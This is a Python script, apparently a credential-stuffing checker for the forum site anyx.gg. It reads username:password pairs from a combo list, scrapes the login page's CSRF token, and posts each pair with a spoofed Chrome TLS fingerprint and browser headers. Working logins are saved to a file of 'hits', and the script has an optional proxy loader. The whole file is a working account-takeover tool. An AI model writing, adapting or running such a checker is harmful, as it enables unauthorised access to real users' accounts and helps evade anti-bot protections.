import json
import tls_client

class anyx:
    def __init__(self):
        self.session = tls_client.Session(client_identifier="chrome_117")
        
        
    def loadcombo(self, path):
        with open(path, 'r') as file:
            lines = file.readlines()
            for line in lines:
                user, password = line.strip().split(':')
                if self.checker(user, password):
                    print(f"HIT: {user}")
                    with open("valid.txt", "a") as valid_file:
                        valid_file.write(f"{user}:{password}\n")
                else:
                    print(f"BAD: {user}")
                    
    def loadproxy(self, path):
        with open(path, 'r') as file:
            lines = file.readlines()
            for line in lines:
                proxy = line.strip()
                self.session.proxies = {
                    "http": proxy,
                    "https": proxy
                }
                print(f"Proxy set to: {proxy}")
        
    def checker(self, user, password):
        login = self.session.get("https://anyx.gg/login/login").text
        data_csrf = login.split('data-csrf="')[1].split('"')[0]
        if not data_csrf:
            return
                
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'tr-TR,tr;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'referer': 'https://anyx.gg/login/login',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        }
        
        data = {
            '_xfToken': data_csrf,
            'login': user,
            'password': password,
            'remember': '1',
            '_xfRedirect': 'https://anyx.gg/',
        }
        
        response = self.session.post("https://anyx.gg/login/login", headers=headers, data=data)
        if "could not be found." in response.text:
            return False
        elif "Incorrect password." in response.text:
            return False
        elif "banned" in response.text:
            return False
        else: 
            return True
            

anyx = anyx()
anyx.loadcombo("acc.txt")